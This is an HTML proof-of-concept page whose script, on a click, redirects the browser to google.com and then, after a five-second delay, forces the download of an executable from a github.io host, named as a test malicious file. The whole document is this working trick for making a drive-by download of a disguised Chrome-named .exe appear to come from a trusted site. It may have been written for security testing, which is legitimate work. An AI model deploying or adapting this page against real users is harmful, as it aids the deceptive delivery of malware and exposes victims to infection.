<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Delayed File Download PoC</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: sans-serif;
      background-color: #fafafa;
      cursor: pointer;
      user-select: none;
    }
    h1 {
      color: #333;
      text-align: center;
      max-width: 400px;
      padding: 20px;
    }
  </style>
</head>
<body>
  <h1>Click anywhere to trigger file download after delay.</h1>

  <script>
    document.addEventListener('click', async () => {
      // After user clicks, redirect to a "trusted" site (this simulates the delay)
      window.location.href = 'https://www.google.com'; // Redirect to Google

      setTimeout(() => {
        // After 5 seconds, try to trigger download
        const link = document.createElement('a');
        link.href = 'https://ecdnts-del.github.io/test-apk/chromeIOS.exe'; // Example malicious file
        link.download = 'test-malicious-file.exe'; // File name for download
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      }, 5000); // 5 seconds delay before download starts
    });
  </script>
</body>
</html>
